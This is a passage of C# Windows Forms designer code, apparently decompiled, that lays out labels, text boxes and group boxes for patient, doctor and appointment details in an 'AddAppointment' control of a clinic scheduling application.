      this.lblDoctorName.Size = new Size(120, 20);
      this.lblDoctorName.TabIndex = 12;
      this.lblDoctorName.Text = "Doctor Name";
      this.txtName.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtName.Location = new Point(161, 68);
      this.txtName.Name = "txtName";
      this.txtName.Size = new Size(359, 30);
      this.txtName.TabIndex = 6;
      this.lblPersonName.AutoSize = true;
      this.lblPersonName.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonName.Location = new Point(15, 73);
      this.lblPersonName.Name = "lblPersonName";
      this.lblPersonName.Size = new Size(57, 20);
      this.lblPersonName.TabIndex = 21;
      this.lblPersonName.Text = "Name";
      this.grpBoxPatientInfo.Controls.Add((Control) this.cmbBloodGroup);
      this.grpBoxPatientInfo.Controls.Add((Control) this.cmbGender);
      this.grpBoxPatientInfo.Controls.Add((Control) this.txtPhone);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonPhone);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonBloodGroup);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonGender);
      this.grpBoxPatientInfo.Controls.Add((Control) this.txtAge);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonAge);
      this.grpBoxPatientInfo.Controls.Add((Control) this.txtPersonID);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonID);
      this.grpBoxPatientInfo.Controls.Add((Control) this.txtName);
      this.grpBoxPatientInfo.Controls.Add((Control) this.lblPersonName);
      this.grpBoxPatientInfo.Location = new Point(16, 18);
      this.grpBoxPatientInfo.Name = "grpBoxPatientInfo";
      this.grpBoxPatientInfo.Size = new Size(551, 278);
      this.grpBoxPatientInfo.TabIndex = 22;
      this.grpBoxPatientInfo.TabStop = false;
      this.grpBoxPatientInfo.Text = "Patient's Information";
      this.grpBoxAppointmentInfo.Controls.Add((Control) this.cmbAppointmentTime);
      this.grpBoxAppointmentInfo.Controls.Add((Control) this.dtpAppointmentDate);
      this.grpBoxAppointmentInfo.Controls.Add((Control) this.lblTime);
      this.grpBoxAppointmentInfo.Controls.Add((Control) this.lblDate);
      this.grpBoxAppointmentInfo.Location = new Point(597, 139);
      this.grpBoxAppointmentInfo.Name = "grpBoxAppointmentInfo";
      this.grpBoxAppointmentInfo.Size = new Size(486, 112);
      this.grpBoxAppointmentInfo.TabIndex = 23;
      this.grpBoxAppointmentInfo.TabStop = false;
      this.grpBoxAppointmentInfo.Text = "Appointment's Information";
      this.grpBoxDoctorInfo.Controls.Add((Control) this.txtDoctorID);
      this.grpBoxDoctorInfo.Controls.Add((Control) this.lblDoctorID);
      this.grpBoxDoctorInfo.Controls.Add((Control) this.txtDoctorName);
      this.grpBoxDoctorInfo.Controls.Add((Control) this.lblDoctorName);
      this.grpBoxDoctorInfo.Location = new Point(597, 18);
      this.grpBoxDoctorInfo.Name = "grpBoxDoctorInfo";
      this.grpBoxDoctorInfo.Size = new Size(486, 115);
      this.grpBoxDoctorInfo.TabIndex = 24;
      this.grpBoxDoctorInfo.TabStop = false;
      this.grpBoxDoctorInfo.Text = "Doctor's Information";
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.Controls.Add((Control) this.grpBoxDoctorInfo);
      this.Controls.Add((Control) this.grpBoxAppointmentInfo);
      this.Controls.Add((Control) this.grpBoxPatientInfo);
      this.Controls.Add((Control) this.txtSearchDoctor);
      this.Controls.Add((Control) this.txtSearchPerson);
      this.Controls.Add((Control) this.btnSearchDoctor);
      this.Controls.Add((Control) this.btnSearchPerson);
      this.Controls.Add((Control) this.btnClearAll);
      this.Controls.Add((Control) this.btnConfirmAppointment);
      this.Controls.Add((Control) this.tableLayoutPanel1);
      this.Name = nameof (AddAppointment);
      this.Padding = new Padding(10, 0, 10, 0);
      this.Size = new Size(1100, 623);
      this.Load += new EventHandler(this.AddAppointment_Load);
      this.VisibleChanged += new EventHandler(this.AddAppointment_VisibleChanged);
      this.tableLayoutPanel1.ResumeLayout(false);
      ((ISupportInitialize) this.dgvPersonView).EndInit();
      ((ISupportInitialize) this.dgvDoctorView).EndInit();
      this.grpBoxPatientInfo.ResumeLayout(false);
      this.grpBoxPatientInfo.PerformLayout();
      this.grpBoxAppointmentInfo.ResumeLayout(false);
      this.grpBoxAppointmentInfo.PerformLayout();
      this.grpBoxDoctorInfo.ResumeLayout(false);
      this.grpBoxDoctorInfo.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
